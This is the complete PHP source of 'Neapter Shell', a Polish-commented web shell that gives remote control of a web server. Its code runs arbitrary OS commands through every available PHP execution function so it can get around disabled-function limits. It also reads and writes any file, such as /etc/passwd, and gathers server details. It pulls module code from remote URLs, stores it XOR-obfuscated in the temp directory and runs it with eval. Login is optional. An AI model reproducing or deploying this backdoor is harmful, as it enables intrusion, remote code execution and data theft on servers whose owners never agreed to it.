<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

require_once dirname( __FILE__ ) . '/Lib/Arr.php';
require_once dirname( __FILE__ ) . '/Lib/Request.php';
require_once dirname( __FILE__ ) . '/Lib/ShellInterface.php';
require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';

/**
 * class Shell - Zarzadzanie serwerem
 *
 * @version 0.31a
 *
 * @uses Arr
 * @uses Request
 * @uses Form
 */
class Shell
{
	/**
	 * Wersja
	 */
	const VERSION = '0.31a b110908';

	/**
	 * Help, natywne polecenia
	 */
	const HELP = '
help - Wyświetlanie pomocy
modules - Informacje o modułach
edit - Edycja oraz tworzenie nowego pliku
system, exec - Uruchomienie polecenia systemowego
info - Wyświetla informacje o systemie';

	/**
	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
	 *
	 * format: sha1( $user . "\xff" . $pass );
	 *
	 * @access public
	 * @var    string
	 */
	public $sAuth;

	/**
	 * Czas generowania strony
	 *
	 * @access private
	 * @var    float
	 */
	private $fGeneratedIn;

	/**
	 * SafeMode ON / OFF
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bSafeMode;

	/**
	 * Tablica wylaczaonych funkcji
	 *
	 * @access private
	 * @var    array
	 */
	private $aDisableFunctions = array();

	/**
	 * Mozliwe jest wykonanie polecenia systemowego ?
	 *
	 * @access private
	 * @var    boolean
	 */
	private $bExec = FALSE;

	/**
	 * Dzialamy w srodowisku Windows ?
	 *
	 * @access public
	 * @var    boolean
	 */
	public $bWindows = FALSE;

	/**
	 * Komenda
	 *
	 * @access public
	 * @var    string
	 */
	public $sCmd;

	/**
	 * Lista parametrow
	 *
	 * @access public
	 * @var    array
	 */
	public $aArgv = array();

	/**
	 * Ilosc parametrow
	 *
	 * @access public
	 * @var    integer
	 */
	public $iArgc = 0;

	/**
	 * Lista opcji
	 *
	 * @access public
	 * @var    array
	 */
	public $aOptv = array();

	/**
	 * Ciag jako jeden wielki parametr
	 *
	 * @access public
	 * @var    string
	 */
	public $sArgv;

	/**
	 * Lista modulow i komend
	 *
	 *  [komenda1] => Modul1
	 *  [komenda2] => Modul2
	 *
	 * @access private
	 * @var    string
	 */
	private $aModules = array();

	/**
	 * Lista modulow
	 *
	 *  [Modul] => 'komenda1, komenda2'
	 *
	 * @access private
	 * @var    string
	 */
	private $aHelpModules = array();

	/**
	 * Style CSS
	 *
	 * @ignore
	 * @access private
	 * @var    string
	 */
	private $sStyleSheet;

	/**
	 * Katalog tymczasowy
	 *
	 * @access public
	 * @var    string
	 */
	public $sTmp;

	/**
	 * Konstruktor
	 *
	 * @uses   Request
	 *
	 * @access public
	 * @return void
	 */
	public function __construct()
	{
		/**
		 * Czas generowania strony
		 */
		$this -> fGeneratedIn = microtime( 1 );

		/**
		 * @ignore
		 */
		$this -> sStyleSheet = file_get_contents( 'Styles/haxior.css' );

		/**
		 * Katalog tymczasowy
		 */
		if( isset( $_ENV['TMP'] ) && is_writable( $sDir = $_ENV['TMP'] ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( isset( $_ENV['TEMP'] ) && is_writable( $sDir = $_ENV['TEMP'] ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( isset( $_ENV['TMPDIR'] ) && is_writable( $sDir = $_ENV['TMPDIR'] ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = ini_get( 'session.save_path' ) ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = ini_get( 'upload_tmp_dir' ) ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = ini_get( 'soap.wsdl_cache_dir' ) ) )
		{
			$this -> sTmp = $sDir;
		}
		else if( is_writable( $sDir = sys_get_temp_dir() ) )
		{
			$this -> sTmp = $sDir;
		}

		/**
		 * @see Request::init
		 *
		 * Dostep do zmiennych poprzez metody. Nie trzeba za kazdym razem uzywac konstrukcji:
		 *   ( isset( $_GET['test'] ) && ( $_GET['test'] === 'test' ) )
		 * tylko
		 *   ( Request::getGet( 'test' ) === 'test' )
		 */
		Request::init();

		/**
		 * disable_functions
		 */
		if( ( $sDisableFunctions = ini_get( 'disable_functions' ) ) !== '' )
		{
			$aDisableFunctions = explode( ',', $sDisableFunctions );

			$this -> aDisableFunctions = array_map( create_function( '$sValue', 'return strtolower( trim( $sValue ) );' ), $aDisableFunctions );
		}

		/**
		 * Czy dzialamy na Windowsie ?
		 */
		$this -> bWindows = ( strncmp( PHP_OS, 'WIN', 3 ) === 0 );

		/**
		 * SafeMode
		 */
		$this -> bSafeMode = (boolean) ini_get( 'safe_mode' );

		/**
		 * Mozliwosc wywolania polecenia systemowego
		 */
		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( array( 'exec', 'shell_exec', 'passthru', 'system', 'popen', 'proc_open' ), $this -> aDisableFunctions ) ) > 0 ) );

		/**
		 * Jesli SafeMode jest wylaczony
		 */
		if( ! $this -> bSafeMode )
		{
			ini_set( 'display_errors', 1 );
			ini_set( 'max_execution_time', 0 );
			ini_set( 'memory_limit', '1024M' );
			ini_set( 'default_socket_timeout', 5 );
			ini_set( 'date.timezone', 'Europe/Warsaw' );
			ini_set( 'html_errors', 0 );
		}

		/**
		 * Config
		 */
		error_reporting( -1 );
		ignore_user_abort( 0 );
		date_default_timezone_set( 'Europe/Warsaw' );

		/**
		 * Wczytywanie modulow
		 */
		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );

		/**
		 * p jak PURE
		 */
		if(    ! isset( $_GET['p'] )
		    && is_file( $sFilePath = $this -> sTmp . '/' . $sKey )
		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
		)
		{
			/**
			 * f jak FLUSH
			 */
			if( isset( $_GET['f'] ) )
			{
				unlink( $sFilePath );
			}
			else
			{
				$iDataLen = strlen( $sData );

				$sNewData = NULL;

				/**
				 * Deszyfrowanie zawartosci pliku
				 */
				for( $i = 0; $i < $iDataLen; $i++ )
				{
					$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
				}

				eval( '?>' . $sNewData . '<?' );
			}
		}

		/**
		 * Lista dostepnych modulow
		 */
		$aClasses = get_declared_classes();

		foreach( $aClasses as $sClass )
		{
			/**
			 * Wyszukiwanie klas z prefixem Module
			 */
			if( ( strncmp( $sClass, 'Module', 6 ) === 0 ) && ( $sClass !== 'ModuleDummy' ) )
			{
				$oModule = new $sClass( $this );

				/**
				 * Klasa musi implementowac ShellInterface
				 */
				if( $oModule instanceof ShellInterface )
				{
					$aCommands = $oModule -> getCommands();

					foreach( $aCommands as $sCommand )
					{
						$this -> aModules[ $sCommand ] = $sClass;
					}

					$this -> aHelpModules[ $sClass ] = implode( ', ', $aCommands );
				}
			}
		}
	}

	/**
	 * Zwracanie nazwy hosta i portu
	 *
	 * @access private
	 * @param  integer $sHost Host / Host:port
	 * @return array          Host i port
	 */
	public function getHost( $sHost )
	{
		$iPort = 0;
		if( strpos( $sHost, ':' ) !== FALSE )
		{
			list( $sHost, $iPort ) = explode( ':', $sHost );
		}

		return array( $sHost, (int) $iPort );
	}

	/**
	 * Pobieranie statusu TAK / NIE
	 *
	 * @access private
	 * @param  boolean $bValue    Wartosc
	 * @param  boolean $bNegative Negacja 1, 0 zwroci zielone TAK, 1, 1 zwroci czerwone TAK
	 * @return string             Status
	 */
	private function getStatus( $bValue, $bNegative = FALSE )
	{
		return sprintf( '<span class="%s">%s</span>', ( ( $bNegative ? ! $bValue : $bValue ) ? 'green' : 'red' ), ( $bValue ? 'TAK' : 'NIE' ) );
	}

	/**
	 * Pobieranie menu
	 *
	 * @access private
	 * @return string  Menu w HTMLu
	 */
	private function getMenu()
	{
		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
				'SafeMode: %s<br />' .
				'OpenBaseDir: %s<br />' .
				'Serwer Api: <strong>%s</strong><br />' .
				'Serwer: <strong>%s</strong><br />' .
				'TMP: <strong>%s</strong><br />' .
				'Zablokowane funkcje: <strong>%s</strong><br />' .
				'Dostępne moduły: <strong>%s</strong>',

				phpversion(),
				$this -> getStatus( $this -> bSafeMode, TRUE ),
				$this -> getStatus( ini_get( 'open_basedir' ), TRUE ),
				php_sapi_name(),
				php_uname(),
				$this -> sTmp,
				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions ),
				implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) )
		);
	}

	/**
	 * Komenda - modules
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandModules()
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
modules - Informacje o modułach

	Użycie:
		modules version - wyświetlanie wersji modułów

		modules ścieżka_do_pliku_z_modułami

	Przykład:
		modules version
		modules /tmp/modules
		modules http://example.com/modules.txt
DATA;
		}

		/**
		 * Wyswietlanie wersji bibliotek
		 */
		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'version' ) )
		{
			/**
			 * Szukanie najdluzszej nazwy modulu
			 */
			$iMaxLen = 0;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				if( ( $iLen = strlen( $sModule ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}

			/**
			 * Wersja modulu
			 */
			$sOutput = NULL;
			foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
			{
				$oModule = new $sModule( $this );

				$sOutput .= str_pad( $sModule, $iMaxLen, ' ' ) . ' - ' . $oModule -> getVersion() . "\r\n";
			}

			return htmlspecialchars( $sOutput );
		}

		/**
		 * Pobieranie pliku z http
		 */
		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
		{
			if( ( $sData = file_get_contents( $this -> aArgv[0] ) ) === FALSE )
			{
				return 'Nie można pobrać pliku z modułami';
			}

			$sFilePath = tempnam( $this -> sTmp, 'shell' );
			file_put_contents( $sFilePath, $sData );
		}
		/**
		 * Wczytywanie pliku
		 */
		else
		{
			if( ! ( is_file( $this -> aArgv[0] ) && ( ( $sData = file_get_contents( $this -> aArgv[0] ) ) !== FALSE ) ) )
			{
				return 'Nie można wczytać pliku z modułami';
			}

			$sFilePath = $this -> aArgv[0];
		}

		/**
		 * Szyfrowanie zawartosci pliku
		 */
		$sKey = sha1( Request::getServer( 'SCRIPT_FILENAME' ) ) . md5( filectime( Request::getServer( 'SCRIPT_FILENAME' ) ) );

		$iDataLen = strlen( $sData );

		$sNewData = NULL;

		for( $i = 0; $i < $iDataLen; $i++ )
		{
			$sNewData .= chr( ord( substr( $sData, $i, 1 ) ) ^ ord( substr( $sKey, ( $i % 36 ) * 2, 2 ) ) );
		}

		file_put_contents( $this -> sTmp . '/' . $sKey, $sNewData );

		/**
		 * Usuwanie tymczasowego pliku
		 */
		if( strncmp( $this -> aArgv[0], 'http://', 7 ) === 0 )
		{
			unlink( $sFilePath );
		}

		header( 'Refresh:1;url=' . Request::getCurrentUrl(), TRUE );

		return 'Plik z modułami został załadowany';
	}

	private function getCommandCr3d1ts()
	{
		return <<<DATA
Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.

Jakieś sugestie, pytania ? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
DATA;
	}

	/**
	 * Komenda - help
	 *
	 * @access private
	 * @return string
	 */
	private function getCommandHelp()
	{
		$iMaxLen = 0;

		/**
		 * Szukanie najdluzszego ciagu (najdluzsza komenda)
		 */
		foreach( $this -> aHelpModules as $sModuleCmd )
		{
			if( ( $iLen = strlen( $sModuleCmd ) ) > $iMaxLen )
			{
				$iMaxLen = $iLen;
			}
		}

		$sOutput = NULL;

		/**
		 * Formatowanie natywnego helpa
		 */

		$aHelp = array_filter( preg_split( '~\r\n|\n|\r~', self::HELP ) );

		/**
		 * Szukanie najdluzszego ciagu (najdluzsza komenda)
		 */
		if( $iMaxLen === 0 )
		{
			foreach( $aHelp as $sLine )
			{
				if( ( $iLen = strpos( $sLine, '-' ) ) > $iMaxLen )
				{
					$iMaxLen = $iLen;
				}
			}
		}

		/**
		 * Formatowanie helpow
		 */
		foreach( $aHelp as $sLine )
		{
			$iPos = strpos( $sLine, '-' );

			$sOutput .= str_pad( substr( $sLine, 0, $iPos ), $iMaxLen, ' ' ) . rtrim( substr( $sLine, $iPos -  1 ) ) . "\r\n";
		}


		/**
		 * Formatowanie helpow
		 */
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sHelp = $oModule -> getHelp();

			$iPos = ( ( ( $iPos = strpos( $sHelp, "\n" ) ) !== FALSE ) ? $iPos : strlen( $sHelp ) );
			$sOutput .= str_pad( $sModuleCmd, $iMaxLen, ' ' ) . ' - ' . trim( substr( $sHelp, 0, $iPos ) ) . "\r\n";
		}

		$sOutput .= "\r\n\r\n";

		/**
		 * Naglowki
		 */
		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
		{
			$oModule = new $sModule( $this );

			$sOutput .= $sModuleCmd . ' - ' . $oModule -> getHelp() . "\r\n\r\n\r\n";
		}

		return htmlspecialchars( substr( $sOutput, 0, -6 ) );
	}

	/**
	 * Wykonanie polecenia systemowago
	 *
	 * @access public
	 * @param  string $sCmd Komenda
	 * @return string
	 */
	public function getCommandSystem( $sCmd )
	{
		if( ! $this -> bSafeMode )
		{
			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
			{
				chdir( substr( $sCmd, 3 ) );
			}

			ob_start();
			/**
			 * system
			 */
			if( ! in_array( 'system', $this -> aDisableFunctions ) )
			{
				echo "system():\r\n\r\n";
				system( $sCmd );
			}
			/**
			 * shell_exec
			 */
			else if( ! in_array( 'shell_exec', $this -> aDisableFunctions ) )
			{
				echo "shell_exec():\r\n\r\n";
				echo shell_exec( $sCmd );
			}
			/**
			 * passthru
			 */
			else if( ! in_array( 'passthru', $this -> aDisableFunctions ) )
			{
				echo "passthru():\r\n\r\n";
				passthru( $sCmd );
			}
			/**
			 * exec
			 */
			else if( ! in_array( 'exec', $this -> aDisableFunctions ) )
			{
				echo "exec():\r\n\r\n";
				exec( $sCmd, $aOutput );
				foreach( $aOutput as $sLine )
				{
					printf( "%s\r\n", $sLine );
				}
			}
			/**
			 * popen
			 */
			else if( ! in_array( 'popen', $this -> aDisableFunctions ) )
			{
				echo "popen():\r\n\r\n";
				$rFp = popen( $sCmd, 'r' );
				while( ! feof( $rFp ) )
				{
					echo fread( $rFp, 1024 );
				}
			}
			/**
			 * proc_open
			 */
			else if( ! in_array( 'proc_open', $this -> aDisableFunctions ) )
			{
				echo "proc_open():\r\n\r\n";
				$rFp = proc_open( $sCmd, array
					(
						array( 'pipe', 'r' ),
						array( 'pipe', 'w' )
					),
					$aPipe
				);

				if( is_resource( $rFp ) )
				{
					while( ! feof( $aPipe[1] ) )
					{
						echo fread( $aPipe[1], 1024 );
						usleep( 10000 );
					}
				}
			}
			else
			{
				echo 'Wszystkie funkcje systemowe są poblokowane !!!';
			}

			$sData = ob_get_contents();
			ob_clean();
			ob_end_flush();

			return htmlspecialchars( $sData );
		}

		return 'Safe mode jest włączone, funkcje systemowe nie działają !!!';
	}

	/**
	 * Edycja pliku
	 *
	 * @access public
	 * @param  string         $sCmd Sciezka do pliku
	 * @return string|boolean
	 */
	public function getCommandEdit( $sFile )
	{
		/**
		 * Help
		 */
		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
		{
			return <<<DATA
edit - Edycja oraz tworzenie nowego pliku

	Użycie:
		edit /etc/passwd
		edit /sciezka/do/nowego/pliu
DATA;
		}

		/**
		 * Zapis do pliku
		 */
		if( ( $sFiledata = Request::getPost( 'filedata' ) ) !== FALSE )
		{
			return (boolean) file_put_contents( $sFile, $sFiledata );
		}

		/**
		 * Formularz
		 */
		return sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
			sprintf( '<textarea id="console" name="filedata">%s</textarea><div>', ( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ) ) .
			sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( Request::getPost( 'cmd' ) ) ) .
			'<input type="submit" name="submit" value="Zapisz" id="cmd-send" /></form></div>';
	}

	/**
	 * Wykonanie polecenia systemowago
	 *
	 * @access public
	 * @param  string $sCmd Komenda
	 * @return string
	 */
	private function getCommandInfo()
	{
		/**
		 * Help
		 */
		if( $this -> iArgc !== 0 )
		{
			return <<<DATA
info - Wyświetla informacje o systemie

	Użycie:
		info
DATA;
		}

		return sprintf( "- SERVER:[%s], IP:[%s], Host:[%s]\r\nPHP:[%s], API:[%s], Url:[%s], Path:[%s]\r\nSAFE_MODE:[%d], EXE:[%d], CURL:[%d], SOCKET:[%s]",
			php_uname(),
			( $sIp = Request::getServer( 'REMOTE_ADDR' ) ),
			gethostbyaddr( $sIp ),
			PHP_VERSION,
			php_sapi_name(),
			( ( PHP_SAPI === 'cli ') ? 'CLI' : Request::getCurrentUrl() ),
			Request::getServer( 'SCRIPT_FILENAME' ),
			(int) $this -> bSafeMode,
			(int) $this -> bExec,
			function_exists( 'curl_init' ),
			function_exists( 'socket_create' )

		);
	}

	/**
	 * Domyslna akcja, dostep do konsoli
	 *
	 * @uses   Request
	 * @uses   Form
	 *
	 * @access public
	 * @return string
	 */
	public function getActionBrowser( $sCmd = NULL )
	{
		$bRaw = ( $sCmd !== NULL );

		/**
		 * Wlasna zawartosc strony; domyslnie znajduje sie okno konsoli
		 * linia polecen i przycisk 'Execute'
		 */
		$bOwnContent = FALSE;

		/**
		 * Zawartosc strony
		 */
		$sContent = NULL;

		/**
		 * Zawartosc konsoli
		 */
		$sConsole = NULL;

		/**
		 * Domyslna komenda to :ls -l sciezka_do_katalogu
		 */
		if( $sCmd === NULL )
		{
			if( PHP_SAPI === 'cli' )
			{
				/**
				 * Zmienne globalne to zlo ;), to powinno zostac przekazane
				 * jako parametr w konstruktorze ... ale coz ...
				 */
				$aArgv = $GLOBALS['argv'];
				array_shift( $aArgv );

				$sCmd = implode( $aArgv, ' ' );
			}
			else if( Request::getPost( 'cmd' ) === FALSE  )
			{
				$sCmd = ':ls -l ' . dirname( Request::getServer( 'SCRIPT_FILENAME' ) );
			}
			else
			{
				$sCmd = (string) Request::getPost( 'cmd' );
			}
		}

		/**
		 * Komendy shella rozpoczynaja sie od znaku ':'
		 */
		if( substr( $sCmd, 0, 1 ) === ':' )
		{
			if( ( $iPos = strpos( $sCmd, ' ' ) - 1 ) !== -1 )
			{
				$this -> sCmd = substr( $sCmd, 1, $iPos );
			}
			else
			{
				$this -> sCmd = (string) substr( $sCmd, 1 );
			}

			$this -> sArgv = $this -> rmQuotes( ltrim( preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd ) ) );

			/**
			 * Rozdzielanie argumentow
			 *
			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
			 */
			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
			{
				/**
				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
				 *
				 * Dalbym tutaj lambde, ale php 5.2 tego nie obsluguje ...
				 */
				array_walk( $aMatch[0], array( $this, 'parseArgv' ) );

				$this -> aArgv = $aMatch[0];

				if( isset( $this -> aArgv[0] ) && substr( $this -> aArgv[0], 0, 1 ) === '-' )
				{
					$this -> aOptv = str_split( substr( $this -> aArgv[0], 1 ) );
					array_shift( $this -> aArgv );
					$this -> sArgv = ltrim( implode( ' ', $this -> aArgv ) );
				}
			}

			$this -> iArgc = count( $this -> aArgv );

			/**
			 *  Lista komend i aliasy
			 */
			switch( $this -> sCmd )
			{
				case 'help':
					$sConsole = $this -> getCommandHelp();
					break ;
				case 'modules':
					$sConsole = $this -> getCommandModules();
					break ;
				case 'cr3d1ts':
					$sConsole = $this -> getCommandCr3d1ts();
					break ;
				case 'system':
				case 'exec':
					$sConsole = $this -> getCommandSystem( $this -> sArgv );
					break ;
				case 'info':
					$sConsole = $this -> getCommandInfo();
					break ;
				case 'edit':
					$mContent = $this -> getCommandEdit( $this -> sArgv );

					if( is_bool( $mContent ) )
					{
						$sConsole = sprintf( 'Plik %szostał zapisany', ( ! $mContent ? 'nie ' : NULL ) );
					}
					/**
					 * Help
					 */
					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
					{
						$sConsole = $mContent;
					}
					/**
					 * Formularz sluzacy do edycji pliku
					 */
					else
					{
						$bOwnContent = TRUE;
						$sContent = $mContent;
					}
					break ;
				default :
					if( $this -> aModules === array() )
					{
						$sConsole = 'Nie wczytano żadnych modułów !!!';
					}
					else if( array_key_exists( $this -> sCmd, $this -> aModules ) )
					{
						$sModule = $this -> aModules[ $this -> sCmd ];
						$oModule = new $sModule( $this );

						if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
						{
							$sConsole = $this -> aHelpModules[ $sModule ] . ' - ' . $oModule -> getHelp();
						}
						else
						{
							$sConsole = $oModule -> get();
						}
					}
					else
					{
						$sConsole = sprintf( 'Nie ma takiej komendy "%s"', $this -> sCmd );
					}
			}
		}
		elseif( $sCmd === '' )
		{
			$sConsole = 'Wpisz ":help", by zobaczyć pomoc';
		}
		/**
		 * Wykonanie komendy systemowej
		 */
		else
		{
			$sConsole = $this -> getCommandSystem( $sCmd );
		}

		if( $bRaw || ( PHP_SAPI === 'cli' ) )
		{
			return htmlspecialchars_decode( $sConsole ) . "\r\n";
		}

		/**
		 * Wlasna zawartosc okna
		 */
		if( ! $bOwnContent )
		{
			$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
				     sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
				     sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
				     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
		}

		return $this -> getContent( $sContent );
	}

	/**
	 * Pobieranie calosci strony
	 *
	 * @uses   Request
	 *
	 * @access private
	 * @param  string  $sData         Zawartosc strony
	 * @param  boolean $bExdendedInfo [Optional]<br>Czy wyswietlac informacje o wersji PHP, zaladowanych modulach itp
	 * @return string
	 */
	private function getContent( $sData, $bExdendedInfo = TRUE )
	{
		$sMenu = $this -> getMenu();
		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
		$sVersion = self::VERSION;
return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
<div id=\"body\">" .
( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
"<div id=\"content\">{$sData}</div>" .
( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
"</div></body></html>";
	}

	/**
	 * Wyswietlanie strony
	 *
	 * @access private
	 * @return string
	 */
	public function get()
	{
		/**
		 * Uwierzytelnianie
		 */
		if( $this -> sAuth !== NULL )
		{
			session_start();

			if( ! ( isset( $_SESSION['auth'] ) && ( $_SESSION['auth'] === sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) ) ) ) )
			{
				if( ! ( ( ( $sUser = Request::getPost( 'user') ) !== FALSE )
				    && ( ( $sPass = Request::getPost( 'pass') ) !== FALSE )
				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
				)
				{
					echo $this -> getContent( sprintf( '<form action="%s" method="post"><input type="text" name="user" /><input type="text" name="pass" /><input type="submit" name="submit" value="Go !" /></form>', Request::getCurrentUrl() ), FALSE );
					return ;
				}

				$_SESSION['auth'] = sha1( $this -> sAuth . Request::getServer( 'REMOTE_ADDR' ) );
			}
		}

		/**
		 * Strasznie duzo jest kodu, wygodniej jest rozdzielic
		 * to na inne metody
		 */
		echo $this -> getActionBrowser();
	}

	/**
	 * Oczyszczanie argumentow ze zbednych znakow
	 *
	 * @access private
	 * @param  string & $sVar Argument
	 * @return void
	 */
	private function parseArgv( & $sVar )
	{
		$sVar = strtr( $sVar, array
			(
				'\\\'' => '\'',
				'\\"'  => '"'
			)
		);

		if(    ( ( substr( $sVar, 0, 1 ) === '"' ) && ( substr( $sVar, -1 ) === '"' ) )
		    || ( ( substr( $sVar, 0, 1 ) === '\'' ) && ( substr( $sVar, -1 ) === '\'' ) )
		)
		{
			$sVar = substr( $sVar, 1, -1 );
		}
	}

	/**
	 * Usuwanie poczakowego oraz koncowego znaku " / '
	 *
	 * @access private
	 * @param  string $sVal Ciag znakow
	 * @return string
	 */
	private function rmQuotes( $sVal )
	{
		if(    ( ( substr( $sVal, 0, 1 ) === '"' ) && ( substr( $sVal, -1 ) === '"' ) )
		    || ( ( substr( $sVal, 0, 1 ) === '\'' ) && ( substr( $sVal, -1 ) === '\'' ) )
		)
		{
			return substr( $sVal, 1, -1 );
		}

		return $sVal;
	}

}

/**
 * Wylaczanie wszystkich bufferow
 */
for( $i = 0; $i < ob_get_level(); $i++ )
{
	ob_end_clean();
}

$oShell = new Shell();
$oShell -> get();

exit ;